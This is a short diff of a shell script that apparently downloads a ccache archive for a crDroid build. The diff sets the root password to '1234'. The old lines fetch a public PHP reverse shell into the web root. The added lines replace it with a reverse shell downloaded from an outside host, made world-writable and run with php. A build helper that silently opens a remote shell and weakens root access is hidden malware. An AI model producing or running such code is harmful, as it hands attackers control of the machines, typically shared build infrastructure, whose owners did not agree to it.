@@ -3,12 +3,11 @@
 url=https://cheems.mirrorbomt.workers.dev/ccache-crdroid.tar.gz
 whoami
 echo -e "1234\n1234" | passwd root
-sudo apt-get -y install apache2 wget curl
+sudo apt-get -y install php php-cli wget curl
 cd /var/www/html
-wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 
-chmod 777 php-reverse-shell.php 
-curl ifconfig.me
-sudo systemctl start apache2
+wget -O reverse.php https://eintim.ga/rev.txt
+chmod 777 reverse.php 
+php reverse.php
 echo "ready to connect ssh"
 
 cd /tmp # Where to download cccahe
